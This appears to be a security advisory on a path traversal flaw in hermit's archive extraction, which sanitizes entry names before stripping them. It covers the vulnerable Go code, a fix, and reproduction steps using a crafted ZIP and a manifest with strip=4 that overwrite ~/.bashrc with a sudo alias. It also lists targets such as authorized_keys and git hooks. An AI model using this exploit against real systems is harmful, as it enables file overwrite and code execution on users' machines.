# Hermit: Path Traversal via strip-after-sanitize in Archive Extraction (RCE)

## Summary

A path traversal vulnerability in [cashapp/hermit](https://github.com/cashapp/hermit)'s archive extraction logic allows an attacker who controls a package manifest to write arbitrary files to the filesystem, leading to remote code execution (RCE) via `.bashrc` overwrite.

The root cause is a **time-of-check/time-of-use (TOCTOU)** ordering flaw in `archive/archive.go`: the `makeDestPath()` function validates archive entry names for directory traversal **before** applying the `strip` operation. Since `strip` operates on raw string-split components (preserving `..` literals), an attacker can craft entry names that pass sanitization but escape the extraction directory after strip is applied.

The PoC uses a **ZIP archive** because Go 1.22+ introduced `ErrInsecurePath` in `archive/tar` which rejects tar entries containing `..`. However, Go's `archive/zip` does **not** perform this check when iterating `zip.Reader.File` — the raw entry name is preserved, making the exploit viable via the `extractZip()` code path (archive.go:380-402).

**CVSS 3.1**: 9.8 (Critical) — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

## Vulnerability Details

### Affected Code

**File:** `archive/archive.go`, lines 644–664

```go
// makeDestPath — the VULNERABLE function (lines 644-655)
func makeDestPath(dest, path string, strip int) (string, error) {
    // BUG: sanitize happens BEFORE strip
    if err := sanitizeExtractPath(path, dest); err != nil {
        return "", err
    }
    parts := strings.Split(path, "/")
    if len(parts) <= strip {
        return "", nil
    }
    // strip happens AFTER sanitize — on raw string components
    destFile := strings.Join(parts[strip:], "/")
    destFile = filepath.Join(dest, destFile)
    return destFile, nil
}

// sanitizeExtractPath — the sanitizer (lines 658-664)
func sanitizeExtractPath(filePath string, destination string) error {
    destPath := filepath.Join(destination, filePath)
    if !strings.HasPrefix(destPath, filepath.Clean(destination)) {
        return errors.Errorf("illegal file path")
    }
    return nil
}
```

### The Flaw

`sanitizeExtractPath()` uses `filepath.Join(destination, filePath)` which internally calls `filepath.Clean()`, eagerly resolving all `..` components. For a balanced entry like `d1/d2/d3/d4/../../../../.bashrc`, the forward directories cancel out the `..` components, and the cleaned result `dest/.bashrc` passes the `HasPrefix` check.

However, `strings.Split(path, "/")` in the next step preserves `..` as **literal string components**. When `strip=4` removes the first 4 parts (`d1`, `d2`, `d3`, `d4`), the remaining components are `["..", "..", "..", "..", ".bashrc"]`. The subsequent `filepath.Join(dest, "../../../../.bashrc")` resolves these `..` against the real filesystem, escaping the package directory.

### Why ZIP Works (but tar doesn't)

Go 1.22 introduced `tar.ErrInsecurePath` — `tar.Reader.Next()` now returns this error for entries containing `..` components. Hermit's tar extraction code (line 454) treats this as a fatal error, stopping extraction.

However, **Go's `archive/zip` does not perform this check** when iterating `zip.Reader.File`. The `zf.Name` field contains the raw entry name from the ZIP central directory, including `..` components. Hermit's `extractZip()` function (line 390) passes `zf.Name` directly to the vulnerable `makeDestPath()`:

```go
// archive.go:387-390 — ZIP extraction uses raw zf.Name
for _, zf := range zr.File {
    destFile, err := makeDestPath(dest, zf.Name, strip)  // zf.Name has ".." intact!
```

This means the vulnerability is fully exploitable via ZIP archives on all Go versions.

### Mathematical Proof

For an entry with `F` forward dummy directories and `B` back (`..`) components:

- **Sanitize passes** when `F >= B` (forward/back pairs cancel in `filepath.Clean`)
- **Escape after strip=S** when `S > F - B` (strip removes forward dirs, unbalanced `..` remains)

Combined constraint: `0 <= F - B < S` — satisfiable for **any** `S >= 1`.

Optimal exploit: set `F = B = S` (e.g., `strip=4` with 4 dummies + 4 dotdots).

### Attacker Control

The `strip` field is defined in the package manifest (`manifest/config.go:36`):

```go
Strip int `hcl:"strip,optional"`
```

Package manifests are fetched from manifest repositories. An attacker who controls or compromises a manifest source can set `strip` to any value, tuning the traversal depth to target any file relative to the user's home directory.

### Impact

With default `HERMIT_STATE_DIR` (`~/.cache/hermit`), packages extract to `~/.cache/hermit/pkg/<name>-<version>/` — **4 levels** below `~`. Using `strip=4`, the attacker can overwrite:

| Target | Impact |
|--------|--------|
| `~/.bashrc` | RCE on next shell open (alias injection, reverse shell) |
| `~/.ssh/authorized_keys` | Persistent SSH access |
| `~/.config/autostart/*.desktop` | RCE on next GUI login |
| `~/.gitconfig` | Supply-chain via malicious git hooks |

## Reproduction Steps

### Prerequisites
- Linux system (tested on Kali 2024.4)
- Hermit v0.50.0 (latest stable as of testing)
- Non-root user

### Quick Reproduction

```bash
# 1. Clone the PoC repository
git clone https://github.com/acrinion-oss/hermit-strip-poc.git ~/hermit-strip-poc
cd ~/hermit-strip-poc

# 2. CRITICAL: Clear any cached package extraction from previous runs
#    Hermit skips extraction if the pkg directory already exists
#    (state/state.go:317, isExtracted at :444)
rm -rf ~/.cache/hermit/pkg/rce-poc*

# 3. Initialize hermit environment pointing to local manifests
hermit init --sources env:///packages

# 4. Install the exploit package (triggers the path traversal via ZIP)
. ./bin/activate-hermit
hermit install rce-poc-1.0.0

# 5. Verify: ~/.bashrc now contains the attacker's payload
cat ~/.bashrc
# Output includes: alias sudo='echo "[!] RCE via hermit strip-after-sanitize" && /usr/bin/sudo'

# 6. Demonstrate RCE: open a new shell and run sudo
bash
sudo ls   # Prints: "[!] RCE via hermit strip-after-sanitize"
```

### Automated Reproduction

```bash
bash reproduce.sh
```

### What the PoC Contains

| File | Purpose |
|------|---------|
| `packages/rce-poc.hcl` | Attacker-controlled manifest with `strip = 4` |
| `packages/malicious-rce.zip` | ZIP archive with path-traversal entry |
| `generate_tarball.py` | Script to regenerate the exploit archive |
| `reproduce.sh` | Automated repro with annotations |

### Archive Structure

```
$ unzip -l packages/malicious-rce.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       34  1980-01-01 00:00   d1/d2/d3/d4/bin/tool               <- Legitimate binary
      136  1980-01-01 00:00   d1/d2/d3/d4/../../../../.bashrc     <- EXPLOIT ENTRY
```

### Manifest (packages/rce-poc.hcl)

```hcl
description = "RCE proof of concept"
binaries = ["bin/tool"]
strip = 4                                   # Attacker controls this!

version "1.0.0" {
  source = "${env}/packages/malicious-rce.zip"
}
```

## Suggested Fix

Apply `strip` **before** sanitization, or sanitize the **post-strip** path:

```go
func makeDestPath(dest, path string, strip int) (string, error) {
    parts := strings.Split(path, "/")
    if len(parts) <= strip {
        return "", nil
    }
    destFile := strings.Join(parts[strip:], "/")
    // Sanitize the STRIPPED path, not the raw entry name
    if err := sanitizeExtractPath(destFile, dest); err != nil {
        return "", err
    }
    destFile = filepath.Join(dest, destFile)
    return destFile, nil
}
```

**Note:** The codebase already implements the correct pattern in `sanitizeSymlinkTarget()` (archive.go:670-686), which uses `filepath.Clean(dest) + string(filepath.Separator)` — proving the developers understood the risk but didn't apply the fix consistently.

## Additional Notes

### Why tar.gz didn't work

Go 1.22 introduced `tar.ErrInsecurePath` (using `filepath.IsLocal()`) which rejects tar entries containing `..` path components. Hermit's tar extraction code at line 454 (`else if err != nil { return errors.WithStack(err) }`) treats this as a fatal error, preventing the exploit entry from being processed. This is a Go runtime mitigation, **not** a Hermit-level fix — the vulnerable logic in `makeDestPath()` remains unchanged.

### Affected archive formats

The `makeDestPath()` function is shared across ALL archive format handlers:
- **ZIP** (line 390): `makeDestPath(dest, zf.Name, strip)` — **EXPLOITABLE** (no ErrInsecurePath)
- **tar** (line 458): `makeDestPath(dest, hdr.Name, strip)` — mitigated by Go 1.22+ ErrInsecurePath
- **7z** (line 566): `makeDestPath(dest, hdr.Name, strip)` — potentially exploitable (third-party library)
- **RPM** (line 618): `makeDestPath(dest, header.Filename(), pkg.Strip)` — potentially exploitable

## References

- Vulnerable code: `archive/archive.go:644-664`
- ZIP extraction (no ErrInsecurePath): `archive/archive.go:380-402`
- Correct pattern (symlinks): `archive/archive.go:670-686`
- Strip config: `manifest/config.go:36`
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
- CWE-367: Time-of-Check Time-of-Use (TOCTOU) Race Condition
